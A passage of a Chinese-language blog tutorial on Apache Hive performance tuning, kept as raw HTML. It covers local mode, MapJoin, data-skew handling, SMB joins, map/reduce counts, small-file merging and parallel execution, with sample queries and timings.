class="token keyword">select</span> ename from emp limit 3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）把hive.fetch.task.conversion设置成more，然后执行查询语句，如下查询方式都不会执行mapreduce程序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.fetch.task.conversion<span class="token operator">=</span>more<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp limit 3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-本地模式"><a href="#3-本地模式" class="headerlink" title="3 本地模式"></a>3 本地模式</h1><p>大多数的Hadoop Job是需要Hadoop提供的完整的可扩展性来处理大数据集的。不过，有时Hive的输入数据量是非常小的。在这种情况下，为查询触发执行任务消耗的时间可能会比实际job的执行时间要多的多。对于大多数这种情况，Hive可以通过本地模式在单台机器上处理所有的任务。对于小数据集，执行时间可以明显被缩短。</p><p>用户可以通过设置hive.exec.mode.local.auto的值为true，来让Hive在适当的时候自动启动这个优化。</p><p>set hive.exec.mode.local.auto=true; //开启本地mr</p><p>//设置local mr的最大输入数据量，当输入数据量小于这个值时采用local mr的方式，默认为134217728，即128M</p><p>set hive.exec.mode.local.auto.inputbytes.max=50000000;</p><p>//设置local mr的最大输入文件个数，当输入文件个数小于这个值时采用local mr的方式，默认为4</p><p>set hive.exec.mode.local.auto.input.files.max=10;</p><h2 id="3-1-案例实操："><a href="#3-1-案例实操：" class="headerlink" title="3.1 案例实操："></a>3.1 案例实操：</h2><p>（1）开启本地模式，并执行查询语句</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.mode.local.auto<span class="token operator">=</span>true<span class="token punctuation">;</span> hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>Time taken: 1.328 seconds, Fetched: 14 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）关闭本地模式，并执行查询语句</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.mode.local.auto<span class="token operator">=</span>false<span class="token punctuation">;</span> hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>Time taken: 20.09 seconds, Fetched: 14 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="4-表的优化"><a href="#4-表的优化" class="headerlink" title="4 表的优化"></a>4 表的优化</h1><h2 id="4-1-小表大表Join-MapJoin"><a href="#4-1-小表大表Join-MapJoin" class="headerlink" title="4.1 小表大表Join(MapJoin)"></a>4.1 小表大表Join(MapJoin)</h2><p>将key相对分散，并且数据量小的表放在join的左边，这样可以有效减少内存溢出错误发生的几率；再进一步，可以使用map join让小的维度表（1000条以下的记录条数）先进内存。在map端完成join。</p><p>实际测试发现：新版的hive已经对小表JOIN大表和大表JOIN小表进行了优化。小表放在左边和右边已经没有明显区别。</p><p>案例实操</p><p>1）需求</p><p>测试大表JOIN小表和小表JOIN大表的效率</p><p>2）开启MapJoin参数设置</p><p>（1）设置自动选择Mapjoin</p><p>set hive.auto.convert.join = true; 默认为true</p><p>（2）大表小表的阈值设置（默认25M以下认为是小表）：</p><p>set hive.mapjoin.smalltable.filesize = 25000000;</p><p>3）MapJoin工作机制</p><p>​                         <img src="/2020/11/15/bigdata-hive4-optimize/1637047033227.png" alt="1637047033227">       </p><p>4）建大表、小表和JOIN后表的语句</p><pre class="line-numbers language-bash"><code class="language-bash">// 创建大表create table bigtable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span> // 创建小表create table smalltable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>// 创建join后表的语句create table jointable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）分别向大表和小表中导入数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/bigtable'</span> into table bigtable<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>load data local inpath <span class="token string">'/opt/module/hive/datas/smalltable'</span> into table smalltable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）小表JOIN大表语句</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom smalltable s<span class="token function">join</span> bigtable bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span>Time taken: 35.921 secondsNo rows affected <span class="token punctuation">(</span>44.456 seconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）执行大表JOIN小表语句</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable b<span class="token function">join</span> smalltable son s.id <span class="token operator">=</span> b.id<span class="token punctuation">;</span>Time taken: 34.196 secondsNo rows affected <span class="token punctuation">(</span>26.287 seconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-大表Join大表"><a href="#4-2-大表Join大表" class="headerlink" title="4.2 大表Join大表"></a>4.2 大表Join大表</h2><h3 id="4-2-1-空KEY过滤"><a href="#4-2-1-空KEY过滤" class="headerlink" title="4.2.1 空KEY过滤"></a>4.2.1 空KEY过滤</h3><p>有时join超时是因为某些key对应的数据太多，而相同key对应的数据都会发送到相同的reducer上，从而导致内存不够。此时我们应该仔细分析这些异常的key，很多情况下，这些key对应的数据是异常数据，我们需要在SQL语句中进行过滤。例如key对应的字段为空，操作如下：</p><p>案例实操</p><p>（1）配置历史服务器</p><p>配置mapred-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>property<span class="token operator">></span><span class="token operator">&lt;</span>name<span class="token operator">></span>mapreduce.jobhistory.address<span class="token operator">&lt;</span>/name<span class="token operator">></span><span class="token operator">&lt;</span>value<span class="token operator">></span>hadoop102:10020<span class="token operator">&lt;</span>/value<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span class="token operator">&lt;</span>property<span class="token operator">></span>  <span class="token operator">&lt;</span>name<span class="token operator">></span>mapreduce.jobhistory.webapp.address<span class="token operator">&lt;</span>/name<span class="token operator">></span>  <span class="token operator">&lt;</span>value<span class="token operator">></span>hadoop102:19888<span class="token operator">&lt;</span>/value<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动历史服务器</p><pre class="line-numbers language-bash"><code class="language-bash">sbin/mr-jobhistory-daemon.sh start historyserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看jobhistory</p><p><a href="http://hadoop102:19888/jobhistory">http://hadoop102:19888/jobhistory</a></p><p>（2）创建原始数据表、空id表、合并后数据表</p><p>// 创建空id表</p><pre class="line-numbers language-bash"><code class="language-bash">create table nullidtable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）分别加载原始数据和空id数据到对应表中</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/nullid'</span> into table nullidtable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）测试不过滤空id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table jointable <span class="token keyword">select</span> n.* from nullidtable nleft <span class="token function">join</span> bigtable o on n.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）测试过滤空id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table jointable <span class="token keyword">select</span> n.* from <span class="token punctuation">(</span>select * from nullidtable where <span class="token function">id</span> is not null <span class="token punctuation">)</span> n left <span class="token function">join</span> bigtable o on n.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-2-空key转换"><a href="#4-2-2-空key转换" class="headerlink" title="4.2.2 空key转换"></a>4.2.2 空key转换</h3><p>有时虽然某个key为空对应的数据很多，但是相应的数据不是异常数据，必须要包含在join的结果中，此时我们可以表a中key为空的字段赋一个随机的值，使得数据随机均匀地分不到不同的reducer上。例如：</p><p>案例实操：</p><p>不随机分布空null值：</p><p>（1）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）JOIN两张表</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> n.* from nullidtable n left <span class="token function">join</span> bigtable b on n.id <span class="token operator">=</span> b.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果：如下图所示，可以看出来，出现了数据倾斜，某些reducer的资源消耗远大于其他reducer。</p><p>​                  <img src="/2020/11/15/bigdata-hive4-optimize/1637047154377.png" alt="1637047154377"></p><p>随机分布空null值</p><p>（1）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）JOIN两张表</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> n.* from nullidtable n full <span class="token function">join</span> bigtable o on nvl<span class="token punctuation">(</span>n.id,rand<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果：如下图所示，可以看出来，消除了数据倾斜，负载均衡reducer的资源消耗</p><p>​      <img src="/2020/11/15/bigdata-hive4-optimize/1637047177458.png" alt="1637047177458"></p><h3 id="4-2-3-SMB-Sort-Merge-Bucket-join"><a href="#4-2-3-SMB-Sort-Merge-Bucket-join" class="headerlink" title="4.2.3 SMB(Sort Merge Bucket join)"></a>4.2.3 SMB(Sort Merge Bucket join)</h3><p>（1）创建第二张大表</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable2<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>load data local inpath <span class="token string">'/opt/module/data/bigtable'</span> into table bigtable2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试大表直接JOIN</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable s<span class="token function">join</span> bigtable2 bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建分桶表1,桶的个数不要超过可用CPU的核数</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable_buck1<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> sorted by<span class="token punctuation">(</span>id<span class="token punctuation">)</span>into 6 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>insert into bigtable_buck1 <span class="token keyword">select</span> * from bigtable<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> （3）创建分通表2,桶的个数不要超过可用CPU的核数</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable_buck2<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span>sorted by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> into 6 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>insert into bigtable_buck2 <span class="token keyword">select</span> * from bigtable<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）设置参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> hive.optimize.bucketmapjoin <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">set</span> hive.optimize.bucketmapjoin.sortedmerge <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">set</span> hive.input.format<span class="token operator">=</span>org.apache.hadoop.hive.ql.io.BucketizedHiveInputFormat<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（5）测试</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable_buck1 s<span class="token function">join</span> bigtable_buck2 bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-Group-By"><a href="#4-3-Group-By" class="headerlink" title="4.3 Group By"></a>4.3 Group By</h2><p>默认情况下，Map阶段同一Key数据分发给一个reduce，当一个key数据过大时就倾斜了。</p><p>​      <img src="/2020/11/15/bigdata-hive4-optimize/1637047313467.png" alt="1637047313467"></p><p>并不是所有的聚合操作都需要在Reduce端完成，很多聚合操作都可以先在Map端进行部分聚合，最后在Reduce端得出最终结果。</p><h3 id="4-3-1-开启Map端聚合参数设置"><a href="#4-3-1-开启Map端聚合参数设置" class="headerlink" title="4.3.1 开启Map端聚合参数设置"></a>4.3.1 开启Map端聚合参数设置</h3><p>（1）是否在Map端进行聚合，默认为True</p><p>set hive.map.aggr = true</p><p>（2）在Map端进行聚合操作的条目数目</p><p>set hive.groupby.mapaggr.checkinterval = 100000</p><p>（3）有数据倾斜的时候进行负载均衡（默认是false）</p><p>set hive.groupby.skewindata = true</p><p>当选项设定为 true，生成的查询计划会有两个MR Job。第一个MR Job中，Map的输出结果会随机分布到Reduce中，每个Reduce做部分聚合操作，并输出结果，这样处理的结果是相同的Group By Key有可能被分发到不同的Reduce中，从而达到负载均衡的目的；第二个MR Job再根据预处理的数据结果按照Group By Key分布到Reduce中（这个过程可以保证相同的Group By Key被分布到同一个Reduce中），最后完成最终的聚合操作。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> deptno from emp group by deptno<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 23.68 sec  HDFS Read: 19987 HDFS Write: 9 SUCCESSTotal MapReduce CPU Time Spent: 23 seconds 680 msecOKdeptno102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优化以后</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.groupby.skewindata <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> deptno from emp group by deptno<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 28.53 sec  HDFS Read: 18209 HDFS Write: 534 SUCCESSStage-Stage-2: Map: 1 Reduce: 5  Cumulative CPU: 38.32 sec  HDFS Read: 15014 HDFS Write: 9 SUCCESSTotal MapReduce CPU Time Spent: 1 minutes 6 seconds 850 msecOKdeptno102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-4-Count-Distinct-去重统计"><a href="#4-4-Count-Distinct-去重统计" class="headerlink" title="4.4 Count(Distinct) 去重统计"></a>4.4 Count(Distinct) 去重统计</h2><p>数据量小的时候无所谓，数据量大的情况下，由于COUNT DISTINCT操作需要用一个Reduce Task来完成，这一个Reduce需要处理的数据量太大，就会导致整个Job很难完成，一般COUNT DISTINCT使用先GROUP BY再COUNT的方式替换,但是需要注意group by造成的数据倾斜问题.</p><p>1） 案例实操</p><p>（1）创建一张大表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table bigtable<span class="token punctuation">(</span>id bigint, <span class="token function">time</span> bigint, uid string, keywordstring, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimitedfields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）加载数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/datas/bigtable'</span> into table bigtable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）执行去重id查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>distinct id<span class="token punctuation">)</span> from bigtable<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 1  Cumulative CPU: 7.12 sec  HDFS Read: 120741990 HDFS Write: 7 SUCCESSTotal MapReduce CPU Time Spent: 7 seconds 120 msecOKc0100001Time taken: 23.607 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）采用GROUP by去重id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>id<span class="token punctuation">)</span> from <span class="token punctuation">(</span>select <span class="token function">id</span> from bigtable group by id<span class="token punctuation">)</span> a<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 17.53 sec  HDFS Read: 120752703 HDFS Write: 580 SUCCESSStage-Stage-2: Map: 1 Reduce: 1  Cumulative CPU: 4.29 sec2  HDFS Read: 9409 HDFS Write: 7 SUCCESSTotal MapReduce CPU Time Spent: 21 seconds 820 msecOK_c0100001Time taken: 50.795 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然会多用一个Job来完成，但在数据量大的情况下，这个绝对是值得的。</p><h2 id="4-5-笛卡尔积"><a href="#4-5-笛卡尔积" class="headerlink" title="4.5 笛卡尔积"></a>4.5 笛卡尔积</h2><p>尽量避免笛卡尔积，join的时候不加on条件，或者无效的on条件，Hive只能使用1个reducer来完成笛卡尔积。</p><h2 id="4-6-行列过滤"><a href="#4-6-行列过滤" class="headerlink" title="4.6 行列过滤"></a>4.6 行列过滤</h2><p>列处理：在SELECT中，只拿需要的列，如果有分区，尽量使用分区过滤，少用SELECT *。</p><p>行处理：在分区剪裁中，当使用外关联时，如果将副表的过滤条件写在Where后面，那么就会先全表关联，之后再过滤，比如：</p><p>案例实操：</p><p>1）测试先关联两张表，再用where条件过滤</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> o.id from bigtable b<span class="token function">join</span> bigtable  o.id <span class="token operator">=</span> b.idwhere o.id <span class="token operator">&lt;=</span> 10<span class="token punctuation">;</span>Time taken: 34.406 seconds, Fetched: 100 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）通过子查询后，再关联表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> b.id from bigtable b<span class="token function">join</span> <span class="token punctuation">(</span>select <span class="token function">id</span> from bigtable where <span class="token function">id</span> <span class="token operator">&lt;=</span> 10 <span class="token punctuation">)</span> o on b.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span>Time taken: 30.058 seconds, Fetched: 100 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4-7-分区分桶"><a href="#4-7-分区分桶" class="headerlink" title="4.7 分区分桶"></a>4.7 分区分桶</h2><p>在涉及存储结构时候，设置分区分桶，查找时候效率就会更高。</p><h1 id="5-合理设置Map及Reduce数"><a href="#5-合理设置Map及Reduce数" class="headerlink" title="5 合理设置Map及Reduce数"></a>5 合理设置Map及Reduce数</h1><p>1）通常情况下，作业会通过input的目录产生一个或者多个map任务。</p><p>主要的决定因素有：input的文件总个数，input的文件大小，集群设置的文件块大小。</p><p>2）是不是map数越多越好？</p><p>答案是否定的。如果一个任务有很多小文件（远远小于块大小128m），则每个小文件也会被当做一个块，用一个map任务来完成，而一个map任务启动和初始化的时间远远大于逻辑处理的时间，就会造成很大的资源浪费。而且，同时可执行的map数是受限的。</p><p>3）是不是保证每个map处理接近128m的文件块，就高枕无忧了？</p><p>答案也是不一定。比如有一个127m的文件，正常会用一个map去完成，但这个文件只有一个或者两个小字段，却有几千万的记录，如果map处理的逻辑比较复杂，用一个map任务去做，肯定也比较耗时。</p><p>针对上面的问题2和3，我们需要采取两种方式来解决：即减少map数和增加map数；</p><h2 id="5-1-复杂文件增加Map数"><a href="#5-1-复杂文件增加Map数" class="headerlink" title="5.1 复杂文件增加Map数"></a>5.1 复杂文件增加Map数</h2><p>当input的文件都很大，任务逻辑复杂，map执行非常慢的时候，可以考虑增加Map数，来使得每个map处理的数据量减少，从而提高任务的执行效率。</p><p>增加map的方法为：根据</p><p>computeSliteSize(Math.max(minSize,Math.min(maxSize,blocksize)))=blocksize=128M公式，调整maxSize最大值。让maxSize最大值低于blocksize就可以增加map的个数。</p><p>案例实操：</p><p>1）执行查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from emp<span class="token punctuation">;</span>Hadoop job information <span class="token keyword">for</span> Stage-1: number of mappers: 1<span class="token punctuation">;</span> number of reducers: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）设置最大切片值为100个字节</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.input.fileinputformat.split.maxsize<span class="token operator">=</span>100<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from emp<span class="token punctuation">;</span>Hadoop job information <span class="token keyword">for</span> Stage-1: number of mappers: 6<span class="token punctuation">;</span> number of reducers: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-2-小文件进行合并"><a href="#5-2-小文件进行合并" class="headerlink" title="5.2 小文件进行合并"></a>5.2 小文件进行合并</h2><p>1）在map执行前合并小文件，减少map数：CombineHiveInputFormat具有对小文件进行合并的功能（系统默认的格式）。HiveInputFormat没有对小文件合并功能。</p><p>set hive.input.format= org.apache.hadoop.hive.ql.io.CombineHiveInputFormat;</p><p>2）在Map-Reduce的任务结束时合并小文件的设置：</p><p>在map-only任务结束时合并小文件，默认true</p><p>SET hive.merge.mapfiles = true;</p><p>在map-reduce任务结束时合并小文件，默认false</p><p>SET hive.merge.mapredfiles = true;</p><p>合并文件的大小，默认256M</p><p>SET hive.merge.size.per.task = 268435456;</p><p>当输出文件的平均大小小于该值时，启动一个独立的map-reduce任务进行文件merge</p><p>SET hive.merge.smallfiles.avgsize = 16777216;</p><h2 id="5-3-合理设置Reduce数"><a href="#5-3-合理设置Reduce数" class="headerlink" title="5.3 合理设置Reduce数"></a>5.3 合理设置Reduce数</h2><p>1）调整reduce个数方法一</p><p>（1）每个Reduce处理的数据量默认是256MB</p><p>hive.exec.reducers.bytes.per.reducer=256000000</p><p>（2）每个任务最大的reduce数，默认为1009</p><p>hive.exec.reducers.max=1009</p><p>（3）计算reducer数的公式</p><p>N=min(参数2，总输入数据量/参数1)</p><p>2）调整reduce个数方法二</p><p>在hadoop的mapred-default.xml文件中修改</p><p>设置每个job的Reduce个数</p><p>set mapreduce.job.reduces = 15;</p><p>3）reduce个数并不是越多越好</p><p>（1）过多的启动和初始化reduce也会消耗时间和资源；</p><p>（2）另外，有多少个reduce，就会有多少个输出文件，如果生成了很多个小文件，那么如果这些小文件作为下一个任务的输入，则也会出现小文件过多的问题；</p><p>在设置reduce个数的时候也需要考虑这两个原则：处理大数据量利用合适的reduce数；使单个reduce任务处理数据量大小要合适；</p><h1 id="6-并行执行"><a href="#6-并行执行" class="headerlink" title="6 并行执行"></a>6 并行执行</h1><p>Hive会将一个查询转化成一个或者多个阶段。这样的阶段可以是MapReduce阶段、抽样阶段、合并阶段、limit阶段。或者Hive执行过程中可能需要的其他阶段。默认情况下，Hive一次只会执行一个阶段。不过，某个特定的job可能包含众多的阶段，而这些阶段可能并非完全互相依赖的，也就是说有些阶段是可以并行执行的，这样可能使得整个job的执行时间缩短。不过，如果有更多的阶段可以并行执行，那么job可能就越快完成。</p><p>通过设置参数hive.exec.parallel值为true，就可以开启并发执行。不过，在共享集群中，需要注意下，如果job中并行阶段增多，那么集群利用率就会增加。</p><p>set hive.exec.parallel=true;       //打开任务并行执行</p><p>set hive.exec.parallel.thread.number=16; //同一个sql允许最大并行度，默认为8。</p><p>当然，得是在系统资源比较空闲的时候才有优势，否则，没资源，并行也起不来。</p><h1 id="7-严格模式"><a href="#7-严格模式" class="headerlink" title="7 严格模式"></a>7 严格模式</h1><p>Hive可以通过设置防止一些危险操作：</p><p>1）分区表不使用分区过滤</p><p>  